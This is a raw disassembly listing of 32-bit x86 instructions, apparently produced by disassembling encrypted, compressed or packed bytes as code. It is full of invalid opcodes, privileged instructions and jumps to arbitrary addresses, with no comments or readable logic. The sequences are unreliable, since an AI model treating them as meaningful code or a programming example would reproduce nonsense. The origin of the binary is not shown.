  4189a4:	jae    0x4189f0
  4189a6:	fsubr  QWORD PTR [esi+0x1237610f]
  4189ac:	popa   
  4189ad:	pop    esp
  4189ae:	adc    BYTE PTR [ecx+0x5ef76029],ah
  4189b4:	scas   eax,DWORD PTR es:[edi]
  4189b5:	(bad)  
  4189b6:	enter  0xf694,0x13
  4189ba:	sbb    bh,bh
  4189bc:	scas   al,BYTE PTR es:[edi]
  4189bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4189be:	mov    ebp,0xf652ba13
  4189c3:	in     al,dx
  4189c4:	std    
  4189c5:	mov    al,ds:0x906ad4c4
  4189ca:	aam    0x5b
  4189cc:	imul   ebp,DWORD PTR [eax+0x1a],0xc2444cef
  4189d3:	xor    esi,ecx
  4189d5:	inc    ebp
  4189d6:	xchg   ebx,eax
  4189d7:	adc    esi,esi
  4189d9:	pushf  
  4189da:	xlat   BYTE PTR ds:[ebx]
  4189db:	jl     0x418a36
  4189dd:	shr    DWORD PTR [ebx+eax*2+0x40e2fa3e],1
  4189e4:	add    dl,bh
  4189e6:	ja     0x4189dd
  4189e8:	adc    al,0xd5
  4189ea:	inc    ecx
  4189eb:	mov    ebp,0xdb2f38df
  4189f0:	stos   DWORD PTR es:[edi],eax
  4189f1:	xor    edx,DWORD PTR [esp+edx*2+0x35763e8e]
  4189f8:	inc    eax
  4189f9:	dec    esp
  4189fa:	scas   al,BYTE PTR es:[edi]
  4189fb:	add    DWORD PTR [ebx],esi
  4189fd:	sbb    al,0x6a
  4189ff:	cmp    edx,DWORD PTR [edx+0x18]
  418a02:	and    DWORD PTR [ebx],eax
  418a04:	repz mov esi,0x4421697b
  418a0a:	jnp    0x418a19
  418a0c:	jle    0x418a53
  418a0e:	loope  0x418a5b
  418a10:	or     edi,DWORD PTR [ebx]
  418a12:	or     edi,DWORD PTR [ebx]
  418a14:	or     DWORD PTR [esi],eax
  418a16:	popa   
  418a17:	xor    BYTE PTR [edx],dl
  418a19:	gs mov ecx,0x42370ff1
  418a1f:	fsub   QWORD PTR [ebp+0x42]
  418a22:	inc    ecx
  418a23:	jmp    0x6ef6639a
  418a28:	mov    bl,0x1b
  418a2a:	mov    dh,BYTE PTR [ebp+0x42]
  418a2d:	ret    0x4432
  418a30:	xchg   ebp,eax
  418a31:	xchg   BYTE PTR [edi+0x7f],bh
  418a34:	add    edi,ecx
  418a36:	test   al,0x4c
  418a38:	sub    al,0x61
  418a3a:	leave  
  418a3b:	test   eax,0x60b5f352
  418a40:	sbb    al,0xa5
  418a42:	cmc    
  418a43:	lods   al,BYTE PTR ds:[esi]
  418a44:	mov    cl,0x55
  418a46:	aaa    
  418a47:	sar    al,cl
  418a49:	cmp    eax,0xa3274594
  418a4e:	xchg   ebp,eax
  418a4f:	in     eax,dx
  418a50:	cmp    ah,cl
  418a52:	xor    al,0xad
  418a54:	outs   dx,BYTE PTR ds:[esi]
  418a55:	mov    eax,0xb115dbcb
  418a5a:	adc    al,0x4b
  418a5c:	out    dx,al
  418a5d:	mov    al,ds:0xe0e3f92f
  418a62:	pop    ecx
  418a63:	call   0xcbe9:0x2bd8eff8
  418a6a:	sar    al,cl
  418a6c:	inc    ecx
  418a6d:	ins    DWORD PTR es:[edi],dx
  418a6e:	test   eax,0x325a4228
  418a73:	cmp    DWORD PTR [edx+0x46],esi
  418a76:	dec    ecx
  418a77:	sbb    al,0xb7
  418a79:	mov    eax,0x889b22c8
  418a7e:	cld    
  418a7f:	shl    al,0x4f
  418a82:	pop    edi
  418a83:	loope  0x418af0
  418a85:	mov    ebp,0x288f9275
  418a8a:	mov    DWORD PTR [edi+0x19],0x25d43dae
  418a91:	push   0x85a4bf78
  418a96:	mov    ah,0xa2
  418a98:	pop    esp
  418a99:	jl     0x418a86
  418a9b:	pop    ss
  418a9c:	fcmove st,st(4)
  418a9e:	dec    ecx
  418a9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418aa0:	inc    esi
  418aa1:	(bad)  
  418aa2:	fdivr  DWORD PTR ds:0x8e07308f
  418aa8:	mov    al,ds:0x3a3d0e99
  418aad:	imul   eax,DWORD PTR [eax],0x20
  418ab0:	jb     0x418a4d
  418ab2:	push   edx
  418ab3:	xor    eax,0xe55625f3
  418ab8:	cmp    al,0xea
  418aba:	sub    DWORD PTR [ecx],edx
  418abc:	sbb    al,0x38
  418abe:	inc    ebp
  418abf:	mov    ds:0xb3582843,al
  418ac4:	mov    al,ds:0x9f84339
  418ac9:	push   edx
  418aca:	retf   
  418acb:	sti    
  418acc:	stos   DWORD PTR es:[edi],eax
  418acd:	test   eax,edx
  418acf:	arpl   WORD PTR cs:[ebx+ebp*8+0x6e],cx
  418ad4:	mov    edx,0x6ac23207
  418ad9:	call   0x65e1bb28
  418ade:	and    BYTE PTR [esi],bh
  418ae0:	je     0x418ae0
  418ae2:	sub    edx,DWORD PTR [edi+eiz*8]
  418ae5:	mov    ebp,DWORD PTR [esi-0x62]
  418ae8:	and    ebp,DWORD PTR [edx-0x22]
  418aeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418aec:	je     0x418b6c
  418aee:	mov    ah,0x6a
  418af0:	pslld  mm6,mm1
  418af3:	fcomp  DWORD PTR [ecx-0x1e930bde]
  418af9:	push   edx
  418afa:	dec    edx
  418afb:	into   
  418afc:	sbb    al,0x1d
  418afe:	jbe    0x418ae3
  418b00:	xchg   ecx,eax
  418b01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b02:	push   esp
  418b03:	inc    ebp
  418b04:	(bad)  
  418b05:	push   esp
  418b06:	imul   BYTE PTR [ecx+eax*1-0x2eb32ead]
  418b0d:	sub    dl,bl
  418b0f:	cld    
  418b10:	inc    ebp
  418b11:	pop    es
  418b12:	xor    bl,BYTE PTR [edx]
  418b14:	jno    0x418b29
  418b16:	xor    eax,0xe8cca62f
  418b1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b1c:	pop    edi
  418b1d:	xor    edi,0x9c0a89d8
  418b23:	xor    eax,0xba699573
  418b28:	shrd   eax,edi,0x2
  418b2c:	jmp    0x4190b6
  418b31:	xor    DWORD PTR [ecx],0xffffffd8
  418b34:	mov    eax,ds:0x19421898
  418b39:	and    ebp,DWORD PTR [ebx+0xe4672b4]
  418b3f:	push   edx
  418b40:	mov    dl,0x97
  418b42:	pop    ebx
  418b43:	or     al,0x16
  418b45:	cmp    eax,0x99161604
  418b4a:	cmc    
  418b4b:	shl    bh,cl
  418b4d:	push   edi
  418b4e:	fiadd  DWORD PTR [edx]
  418b50:	and    esp,DWORD PTR [ebp-0x7cadf67d]
  418b56:	imul   edi,DWORD PTR [ebp+0x1cc88a75],0xffffff8d
  418b5d:	nop
  418b5e:	test   DWORD PTR ds:0x9a94a19f,esp
  418b64:	sbb    DWORD PTR [ebx],edi
  418b66:	mov    ch,0x58
  418b68:	mov    ch,BYTE PTR [esi+0x58]
  418b6b:	mov    bl,0x68
  418b6d:	mov    eax,0x38456bda
  418b72:	ffreep st(1)
  418b74:	test   BYTE PTR [ecx+0x6f475abb],ah
  418b7a:	jge    0x418b9e
  418b7c:	mov    esp,0x83c80b55
  418b81:	js     0x418bc1
  418b83:	(bad)
  418b86:	js     0x418bfc
  418b88:	inc    esi
  418b89:	sub    DWORD PTR [ebx],edx
  418b8b:	popf   
  418b8c:	and    eax,DWORD PTR [eax+0x32043cab]
  418b92:	es pop esi
  418b94:	aaa    
  418b95:	lock jp 0x418b24
  418b98:	ds es dec ecx
  418b9b:	loopne 0x418bcc
  418b9d:	sub    bh,BYTE PTR [eax-0x67ee6530]
  418ba3:	sti    
  418ba4:	lahf   
  418ba5:	das    
  418ba6:	or     ebx,DWORD PTR [ebp+0x5911c43c]
  418bac:	and    DWORD PTR [ecx-0x60],eax
  418baf:	or     ah,bl
  418bb1:	ds gs icebp 
  418bb4:	or     eax,0xd138cc92
  418bb9:	xchg   esp,eax
  418bba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418bbb:	inc    edi
  418bbc:	stc    
  418bbd:	ins    BYTE PTR es:[edi],dx
  418bbe:	in     al,dx
  418bbf:	jle    0x418b4f
  418bc1:	push   eax
  418bc2:	lea    eax,[edx-0x3284876d]
  418bc8:	scas   al,BYTE PTR es:[edi]
  418bc9:	cmp    ecx,esp
  418bcb:	jb     0x418bbf
  418bcd:	add    eax,0xc387a130
  418bd2:	add    DWORD PTR [ecx-0x3b435568],ecx
  418bd8:	push   es
  418bd9:	pusha  
  418bda:	dec    ebp
  418bdb:	pop    esi
  418bdc:	dec    esp
  418bdd:	push   0x3015f5a3
  418be2:	mov    dh,0x67
  418be4:	bound  eax,QWORD PTR [edx]
  418be6:	jmp    0xad94:0xca5ed1b3
  418bed:	jb     0x418c53
  418bef:	rol    BYTE PTR [ecx+0x52],1
  418bf2:	adc    DWORD PTR [ebx+0x455a978a],esi
  418bf8:	dec    ebp
  418bf9:	fisttp WORD PTR [ebx-0x2a8ba6d8]
  418bff:	in     al,dx
  418c00:	jl     0x418c55
  418c02:	cmc    
  418c03:	jne    0x418bbb
  418c05:	adc    esp,DWORD PTR [esi]
  418c07:	or     BYTE PTR [edi],0xa7
  418c0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c0b:	mov    BYTE PTR [eax+0x58],dh
  418c0e:	pop    ss
  418c0f:	fwait
  418c10:	in     al,0xd7
  418c12:	push   ebp
  418c13:	mov    ebx,0x3bc3dcab
  418c18:	jo     0x418bc6
  418c1a:	scas   al,BYTE PTR es:[edi]
  418c1b:	iret   
  418c1c:	sub    al,0x41
  418c1e:	sub    dl,dh
  418c20:	lods   eax,DWORD PTR ds:[esi]
  418c21:	add    DWORD PTR [ebp-0x1d],eax
  418c24:	iret   
  418c25:	scas   eax,DWORD PTR es:[edi]
  418c26:	enter  0x6075,0xb0
  418c2a:	mov    ch,0xf8
  418c2c:	ja     0x418c4f
  418c2e:	mov    dl,0xdd
  418c30:	sbb    BYTE PTR [edi+0x5c],al
  418c33:	push   edi
  418c34:	sbb    eax,0x594a8f88
  418c39:	add    eax,ebp
  418c3b:	cmp    DWORD PTR [eax-0x2197b40d],edx
  418c41:	xchg   esp,eax
  418c42:	aad    0xe
  418c44:	xchg   ecx,eax
  418c45:	sbb    ah,cl
  418c47:	pusha  
  418c48:	arpl   WORD PTR [ecx+ecx*8+0x5dc3d1c6],dx
  418c4f:	fdiv   QWORD PTR [edi]
  418c51:	or     ah,dl
  418c53:	jge    0x418cc7
  418c55:	jae    0x418c7e
  418c57:	mov    dl,0x6f
  418c59:	xchg   esp,eax
  418c5a:	jne    0x418c9d
  418c5c:	sub    ebp,ebx
  418c5e:	dec    edi
  418c5f:	jo     0x418c42
  418c61:	test   BYTE PTR [edx-0x73],0x6b
  418c65:	pop    es
  418c66:	xchg   DWORD PTR [ebx+0xc],eax
  418c69:	lods   eax,DWORD PTR ds:[esi]
  418c6a:	sbb    eax,0x55f3fc2
  418c6f:	into   
  418c70:	les    ebp,FWORD PTR [ebx]
  418c72:	clc    
  418c73:	sub    DWORD PTR [edi],ecx
  418c75:	xchg   edi,eax
  418c76:	shr    bl,1
  418c78:	dec    edx
  418c79:	cmp    eax,0x5447c636
  418c7e:	aaa    
  418c7f:	lods   eax,DWORD PTR ds:[esi]
  418c80:	cwde   
  418c81:	cmp    BYTE PTR [ebp+0xe],al
  418c84:	cmp    al,0xb7
  418c86:	jmp    0x77c44d9
  418c8b:	leave  
  418c8c:	push   ecx
  418c8d:	dec    ebp
  418c8e:	outs   dx,DWORD PTR ds:[esi]
  418c8f:	mov    eax,0xa7408ab0
  418c94:	jecxz  0x418cb0
  418c96:	jg     0x418c2e
  418c98:	inc    esp
  418c99:	clc    
  418c9a:	xchg   DWORD PTR [eax+ebp*2-0x71],ebx
  418c9e:	shufps xmm7,XMMWORD PTR [ebp+0x9],0xca
  418ca3:	lock mov ch,0x9
  418ca6:	dec    ebx
  418ca7:	test   DWORD PTR [ebp-0x531b795f],ecx
  418cad:	clc    
  418cae:	je     0x418ca5
  418cb0:	and    al,0x27
  418cb2:	jb     0x418cde
  418cb4:	(bad)  
  418cb5:	out    dx,al
  418cb6:	mov    edi,DWORD PTR [eax+0x26985b9f]
  418cbc:	pop    edi
  418cbd:	cwde   
  418cbe:	mov    ds:0xb7e0c88c,eax
  418cc3:	fmulp  st(0),st
  418cc5:	ficomp DWORD PTR [esp+eiz*8-0x409222a5]
  418ccc:	inc    esp
  418ccd:	xchg   DWORD PTR [edi-0x4a],ebx
  418cd0:	jae    0x418c73
  418cd2:	aad    0x45
  418cd4:	jbe    0x418c96
  418cd6:	dec    edx
  418cd7:	xchg   edx,eax
  418cd8:	sub    ch,BYTE PTR [edi+0x6e55dd43]
  418cde:	mul    DWORD PTR [edx]
  418ce0:	cdq    
  418ce1:	test   al,0xe1
  418ce3:	ss jb  0x418cdb
  418ce6:	sub    eax,0xabe566e9
  418ceb:	test   al,0xf5
  418ced:	pop    es
  418cee:	aaa    
  418cef:	mov    DWORD PTR [ecx+0x3f7d058],ebx
  418cf5:	pop    ebp
  418cf6:	out    0x8,al
  418cf8:	dec    edx
  418cf9:	adc    al,0x2
  418cfb:	test   DWORD PTR [edi],esp
  418cfd:	adc    BYTE PTR [eax-0x6f],dh
  418d00:	into   
  418d01:	icebp  
  418d02:	cld    
  418d03:	mov    edi,0x4e77d81f
  418d08:	cmp    DWORD PTR ds:[ebx],esi
  418d0b:	push   cs
  418d0c:	inc    ecx
  418d0d:	inc    edx
  418d0e:	lahf   
  418d0f:	sbb    eax,0x867b8fea
  418d14:	retf   
  418d15:	loope  0x418ca0
  418d17:	dec    ebx
  418d18:	and    eax,0x827f8dbf
  418d1d:	lds    eax,FWORD PTR [eax+0x2d]
  418d20:	int    0x9d
  418d22:	adc    eax,DWORD PTR [eax-0x66]
  418d25:	ja     0x418cda
  418d27:	fbstp  TBYTE PTR [ebx+0x1f]
  418d2a:	das    
  418d2b:	je     0x418d4d
  418d2d:	pop    edi
  418d2e:	in     eax,dx
  418d2f:	mul    al
  418d31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d33:	jno    0x418d81
  418d35:	lods   eax,DWORD PTR ds:[esi]
  418d36:	push   ds
  418d37:	rcl    dh,0xe7
  418d3a:	mov    esi,0xeb256492
  418d3f:	cwde   
  418d40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d41:	sub    DWORD PTR [ebx+0x41],0xb0c9017
  418d48:	call   0x2634:0x8efd9498
  418d4f:	aad    0x94
  418d51:	ret    
  418d52:	in     al,dx
  418d53:	imul   ecx,DWORD PTR ds:0xf784c030,0x40
  418d5a:	sbb    esi,DWORD PTR ds:0xc37d1106
  418d60:	in     eax,0x41
  418d62:	push   0xb
  418d64:	mov    ebp,0x7bba142e
  418d69:	and    BYTE PTR [esi+eax*4+0x37],al
  418d6d:	sbb    DWORD PTR [esi+0x2b],edi
  418d70:	dec    ebp
  418d71:	aad    0x8
  418d73:	mov    al,ds:0xc784c7bc
  418d78:	aad    0xdb
  418d7a:	push   ebx
  418d7b:	mov    esi,0xd1bac945
  418d80:	das    
  418d81:	leave  
  418d82:	push   ebx
  418d83:	outs   dx,DWORD PTR ds:[esi]
  418d84:	pushf  
  418d85:	pop    ds
  418d86:	mul    DWORD PTR [ebx]
  418d88:	pop    edi
  418d89:	aad    0xec
  418d8b:	xor    BYTE PTR ds:0xe0b31e11,dh
  418d91:	mov    dl,0x97
  418d93:	shl    esi,0x2a
  418d96:	push   es
  418d97:	push   ebp
  418d98:	(bad)  
  418d99:	clc    
  418d9a:	loopne 0x418e01
  418d9c:	imul   ebp,DWORD PTR ss:[eax+eiz*2-0x28],0xc6fd9731
  418da5:	add    dh,ch
  418da7:	daa    
  418da8:	jnp    0x418d65
  418daa:	mov    bl,0x52
  418dac:	xchg   esi,eax
  418dad:	and    edi,0x11
  418db0:	pop    edx
  418db1:	mov    fs,eax
  418db3:	mov    esp,0xf553c947
  418db8:	or     eax,0x1f49407d
  418dbd:	retf   0x488
  418dc0:	push   0x34a52ec6
  418dc5:	sub    edx,eax
  418dc7:	mov    ah,0x79
  418dc9:	call   0xe0b6:0x381a3a3d
  418dd0:	(bad)  
  418dd1:	mov    bl,0xc9
  418dd3:	jp     0x418d92
  418dd5:	int3   
  418dd6:	pop    ebx
  418dd7:	sbb    dl,BYTE PTR [ebp-0x26983c25]
  418ddd:	jb     0x418dd9
  418ddf:	loopne 0x418d8a
  418de1:	push   ss
  418de2:	xchg   dh,bh
  418de4:	mov    ch,0x5e
  418de6:	add    cl,ah
  418de8:	pop    ebx
  418de9:	dec    edx
  418dea:	inc    edi
  418deb:	sbb    edi,DWORD PTR [edx]
  418ded:	pop    ds
  418dee:	push   esi
  418def:	cmp    dh,0xf2
  418df2:	pop    edi
  418df3:	lods   al,BYTE PTR ds:[esi]
  418df4:	adc    al,0x94
  418df6:	dec    edi
  418df7:	xor    eax,0x922a172f
  418dfc:	push   esi
  418dfd:	jge    0x418e77
  418dff:	and    BYTE PTR [ecx],ch
  418e01:	dec    esp
  418e02:	enter  0x46e1,0x12
  418e06:	stc    
  418e07:	cmp    al,0x72
  418e09:	and    DWORD PTR [esi-0x21],esp
  418e0c:	fsub   QWORD PTR [ebx-0x2a]
  418e0f:	sub    eax,0xefb3f773
  418e14:	stos   BYTE PTR es:[edi],al
  418e15:	add    BYTE PTR [ebp+0x12],al
  418e18:	sahf   
  418e19:	ds inc eax
  418e1b:	retf   0x2b68
  418e1e:	sub    al,0xae
  418e20:	cdq    
  418e21:	es imul ebx,ecx,0xd03ade1a
  418e28:	pop    es
  418e29:	mov    ah,0x66
  418e2b:	rcr    DWORD PTR [ebx+0x49],0xc
  418e2f:	loope  0x418e6b
  418e31:	mov    al,ds:0xf0fb56f2
  418e36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e37:	mov    edx,0x899b3d73
  418e3c:	and    al,0x8f
  418e3e:	leave  
  418e3f:	xchg   edx,eax
  418e40:	jp     0x418dcd
  418e42:	shl    DWORD PTR [esi],0xae
  418e45:	push   esp
  418e46:	sub    BYTE PTR [ecx],0xcd
  418e49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e4a:	push   ss
  418e4b:	data16 and BYTE PTR [edx-0x3872d1fc],0x29
  418e53:	jae    0x418e8d
  418e55:	icebp  
  418e56:	es mov edx,edx
  418e59:	test   BYTE PTR [edx-0x7cffeb1e],bh
  418e5f:	mov    bh,0x62
  418e61:	ret    0x3f
  418e64:	es inc edi
  418e66:	stos   DWORD PTR es:[edi],eax
  418e67:	jecxz  0x418e95
  418e69:	pusha  
  418e6a:	mov    eax,0xdadfe28f
  418e6f:	call   0xf1eb:0x30b160ab
  418e76:	push   ebp
  418e77:	iret   
  418e78:	add    esp,0xffffffe3
  418e7b:	loop   0x418edd
  418e7d:	shr    DWORD PTR [ecx-0x74e69d02],cl
  418e83:	inc    ecx
  418e84:	cmp    DWORD PTR [esi-0x7b8df78],ebp
  418e8a:	cmp    bh,BYTE PTR [ebx+0x396dfdc6]
  418e90:	mov    esi,0x29f6cfaf
  418e95:	adc    ebx,DWORD PTR [edx-0x39]
  418e98:	(bad)  
  418e99:	popf   
  418e9a:	loopne 0x418f16
  418e9c:	in     eax,0x39
  418e9e:	mov    edx,0x84e7cc97
  418ea3:	xchg   BYTE PTR ds:0xaaf89bcc,dh
  418ea9:	fwait
  418eaa:	jmp    0x418f2a
  418eac:	sbb    cl,dl
  418eae:	std    
  418eaf:	lock xchg edi,eax
  418eb1:	(bad)  
  418eb2:	mov    ecx,0xcde0175d
  418eb7:	dec    esp
  418eb8:	retf   
  418eb9:	mov    eax,ds:0xf57260dc
  418ebe:	add    DWORD PTR [edx+0x73],0x747747ee
  418ec5:	or     eax,0x92930c64
  418eca:	mov    ebx,0xd34b8599
  418ecf:	inc    esi
  418ed0:	dec    eax
  418ed1:	jecxz  0x418e7f
  418ed3:	lods   eax,DWORD PTR ds:[esi]
  418ed4:	inc    edi
  418ed5:	cmp    BYTE PTR [ebp-0x44],ch
  418ed8:	sub    bl,BYTE PTR [eax-0x305a982d]
  418ede:	call   0x3ef2:0x89a87689
  418ee5:	in     al,dx
  418ee6:	xchg   DWORD PTR [edx-0x1507bc42],eax
  418eec:	int3   
  418eed:	addr16 jbe 0x418e84
  418ef0:	push   cs
  418ef1:	addr16 (bad) 
  418ef3:	out    dx,eax
  418ef4:	lods   eax,DWORD PTR ds:[esi]
  418ef5:	fdivr  QWORD PTR [ebx+0x3e]
  418ef8:	outs   dx,BYTE PTR ds:[esi]
  418ef9:	xlat   BYTE PTR ds:[ebx]
  418efa:	pop    ss
  418efb:	call   DWORD PTR [eax]
  418efd:	out    0x8b,al
  418eff:	inc    esi
  418f00:	mov    cl,0x3d
  418f02:	xchg   edx,eax
  418f03:	int    0x61
  418f05:	dec    eax
  418f06:	xchg   DWORD PTR [eax+ebp*4+0x58],ebx
  418f0a:	std    
  418f0b:	stc    
  418f0c:	bound  ebx,QWORD PTR [esi+0x6f]
  418f0f:	jle    0x418ef5
  418f11:	je     0x418efd
  418f13:	and    ah,bh
  418f15:	push   esp
  418f16:	jle    0x418ebe
  418f18:	fnop   
  418f1a:	xchg   BYTE PTR [esi],dh
  418f1c:	xor    ecx,ebx
  418f1e:	bound  edx,QWORD PTR [eax]
  418f20:	retf   
  418f21:	push   0x199d95f0
  418f26:	repnz pop edi
  418f28:	aaa    
  418f29:	shl    BYTE PTR [esi],0xdd
  418f2c:	call   0x284e:0x697c08cc
  418f33:	mov    eax,0xe209d35e
  418f38:	jg     0x418ec1
  418f3a:	add    DWORD PTR [ebp+0x5d86eed3],eax
  418f40:	mov    al,0x54
  418f42:	gs push esp
  418f44:	mov    BYTE PTR ds:0x93d8,ah
  418f49:	cmp    al,BYTE PTR [edx+0xa]
  418f4c:	or     eax,0x9ab9a135
  418f51:	and    ecx,ebx
  418f53:	dec    ebx
  418f54:	ret    0xf8ab
  418f57:	and    edx,edx
  418f59:	mov    dl,0xbd
  418f5b:	outs   dx,BYTE PTR ds:[esi]
  418f5c:	jp     0x418f69
  418f5e:	stos   BYTE PTR es:[edi],al
  418f5f:	div    DWORD PTR [ecx-0x46232e28]
  418f65:	(bad)  
  418f66:	bound  esi,QWORD PTR [ebx-0x75]
  418f69:	sbb    al,BYTE PTR [ebx+0x31ff2f55]
  418f6f:	(bad)  
  418f71:	mov    ebp,0xab20ce9
  418f76:	jo     0x418fab
  418f78:	jmp    0x73ef:0xdb4513bd
  418f7f:	mov    ebp,0x1b9fe461
  418f84:	test   BYTE PTR [ebx+0x1813c32],0x0
  418f8b:	clc    
  418f8c:	and    BYTE PTR [ebp-0x4b],0x95
  418f90:	push   eax
  418f91:	xor    eax,0x981690c4
  418f96:	sar    BYTE PTR [edi+ecx*2],0x39
  418f9a:	mov    ecx,DWORD PTR [esi+ecx*2-0x711f41f2]
  418fa1:	jne    0x418fef
  418fa3:	stos   DWORD PTR es:[edi],eax
  418fa4:	cmp    DWORD PTR [esi+0x2883078d],ebp
  418faa:	jmp    0x22483911
  418faf:	sub    bl,BYTE PTR [ebp+0x11e40440]
  418fb5:	leave  
  418fb6:	test   al,0xc4
  418fb8:	fs cdq 
  418fba:	mov    ecx,0xe87d97fb
  418fbf:	stos   BYTE PTR es:[edi],al
  418fc0:	es sar esi,cl
  418fc3:	or     BYTE PTR [ecx],dh
  418fc5:	aas    
  418fc6:	lock adc eax,eax
  418fc9:	neg    bl
  418fcb:	ins    BYTE PTR es:[edi],dx
  418fcc:	xor    DWORD PTR [eax+ebp*2],0x668bf23e
  418fd3:	add    BYTE PTR [edi],bh
  418fd5:	mov    dl,0xcf
  418fd7:	ss aas 
  418fd9:	sub    BYTE PTR [edx],dl
  418fdb:	scas   eax,DWORD PTR es:[edi]
  418fdc:	stos   DWORD PTR es:[edi],eax
  418fdd:	or     al,0x91
  418fdf:	lahf   
  418fe0:	add    DWORD PTR [edx],0xfffffff5
  418fe3:	ins    DWORD PTR es:[edi],dx
  418fe4:	ficom  DWORD PTR [ecx+0x3def1c9c]
  418fea:	xor    al,ah
  418fec:	test   esp,ecx
  418fee:	add    BYTE PTR [esi-0x1e],dl
  418ff1:	sar    DWORD PTR [ecx],0x31
  418ff4:	mov    ch,0xb4
  418ff6:	dec    ecx
  418ff7:	icebp  
  418ff8:	or     eax,0xfb2fdcf2
  418ffd:	mov    dl,0xb4
  418fff:	mov    dh,0x9c
  419001:	xchg   esp,eax
  419002:	adc    eax,0xed099407
  419007:	mov    dl,0xde
  419009:	jo     0x419028
  41900b:	cld    
  41900c:	sub    al,0xe8
  41900e:	(bad)  
  41900f:	mov    ss,esp
  419011:	sub    esp,ebp
  419013:	jmp    0xd816a687
  419018:	mov    cl,bl
  41901a:	mov    edx,0x58403e6e
  41901f:	and    edx,DWORD PTR ds:0x34039605
  419025:	and    ebx,DWORD PTR [ebp+0x76]
  419028:	aas    
  419029:	ins    DWORD PTR es:[edi],dx
  41902a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41902b:	lds    ebp,FWORD PTR [ebp+0x8]
  41902e:	or     ch,al
  419030:	pop    esi
  419031:	mov    ds:0x98c5400,eax
  419036:	pop    eax
  419037:	sti    
  419038:	add    ecx,DWORD PTR [ebp+0x8f70b6d]
  41903e:	in     al,0x98
  419040:	test   bl,0xb1
  419043:	push   0xc7825b23
  419048:	sbb    BYTE PTR [edi-0x3e],ah
  41904b:	xchg   DWORD PTR [ecx+0x6e],ebx
  41904e:	addr16 ret 
  419050:	jge    0x419092
  419052:	mov    ebx,0xdbf89105
  419057:	bound  ebx,QWORD PTR [ecx+ebp*2]
  41905a:	sbb    eax,0xce1714f6
  41905f:	outs   dx,BYTE PTR ds:[esi]
  419060:	jecxz  0x41909d
  419062:	xor    edi,ecx
  419064:	fwait
  419065:	stos   BYTE PTR es:[edi],al
  419066:	leave  
  419067:	jns    0x4190e5
  419069:	mov    al,0xc2
  41906b:	mov    dh,0x1b
  41906d:	js     0x419028
  41906f:	fidiv  WORD PTR [ecx]
  419071:	test   BYTE PTR [eax],dl
  419073:	mov    fs,eax
  419075:	les    edi,FWORD PTR [edi]
  419077:	popf   
  419078:	sti    
  419079:	mov    cl,0x5
  41907b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41907c:	and    ch,BYTE PTR [edx]
  41907e:	mov    DWORD PTR [edx+0x4c],edi
  419081:	in     eax,dx
  419082:	shl    bl,1
  419084:	leave  
  419085:	jbe    0x4190f4
  419087:	popf   
  419088:	push   edi
  419089:	pop    ds
  41908a:	and    cl,BYTE PTR [esi+0x5a]
  41908d:	mov    dl,0xe6
  41908f:	cmp    DWORD PTR [ecx],ebx
  419091:	jbe    0x419110
  419093:	mov    dh,0xeb
  419095:	xchg   esi,eax
  419096:	out    0x35,eax
  419098:	push   ebp
  419099:	dec    esp
  41909a:	mov    cl,0xd5
  41909c:	cmp    eax,0xd1557bc7
  4190a1:	jno    0x419122
  4190a3:	sub    DWORD PTR [ebp-0x2ab14a7b],esp
  4190a9:	test   al,0x1b
  4190ab:	in     eax,dx
  4190ac:	addr16 loopne 0x41907a
  4190af:	inc    esi
  4190b0:	mov    edi,0x3f8c83b1
  4190b5:	jo     0x4190ea
  4190b7:	leave  
  4190b8:	shr    edi,0x2
  4190bb:	or     edi,DWORD PTR [ebp+0x14]
  4190be:	or     eax,ecx
  4190c0:	cmp    edx,eax
  4190c2:	jne    0x41965b
  4190c8:	cmp    DWORD PTR [ebp+0xc],edi
  4190cb:	jmp    0x419655
  4190d0:	arpl   WORD PTR [edi+0x1f],di
  4190d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190d4:	adc    esp,DWORD PTR [esi+0x24f3262]
  4190da:	xchg   esi,eax
  4190db:	outs   dx,BYTE PTR ds:[esi]
  4190dc:	cmp    BYTE PTR [ecx+0x26],0x74
  4190e0:	mov    esp,0x3d160c59
  4190e5:	add    al,0x16
  4190e7:	push   ss
  4190e8:	stos   BYTE PTR es:[edi],al
  4190e9:	int3   
  4190ea:	or     bh,ch
  4190ec:	jb     0x419148
  4190ee:	pop    eax
  4190ef:	test   eax,0x3098abbf
  4190f4:	gs pop ebx
  4190f6:	mov    dh,BYTE PTR [edx+eax*1-0x69]
  4190fa:	mov    ds:0x2d4ec320,eax
  4190ff:	cli    
  419100:	pop    eax
  419101:	push   esp
  419102:	loop   0x41912c
  419104:	pushw  es
  419106:	mov    al,0xcf
  419108:	xchg   ebx,eax
  419109:	or     ah,BYTE PTR [edx]
  41910b:	push   edx
  41910c:	cld    
  41910d:	sbb    BYTE PTR [edx-0x4a],ah
  419110:	cmp    eax,0x9a4bdc6f
  419115:	jbe    0x41911d
  419117:	popf   
  419118:	(bad)  
  41911a:	rcl    DWORD PTR [eax-0x54],0x83
  41911e:	xchg   ch,cl
  419120:	ret    0x8157
  419123:	ds fxch st(0)
  419126:	sub    eax,0x9aaa86c1
  41912b:	adc    eax,DWORD PTR [esp+ebx*2]
  41912e:	sti    
  41912f:	mov    ebx,0xe3206855
  419134:	mov    ebp,0x79150610
  419139:	dec    ebp
  41913a:	or     esp,DWORD PTR [edx+0x5f5141d1]
  419140:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419141:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419142:	rcl    ecx,cl
  419144:	dec    esi
  419145:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419146:	and    DWORD PTR [edx+esi*8-0x63],0xffffffa4
  41914b:	dec    esp
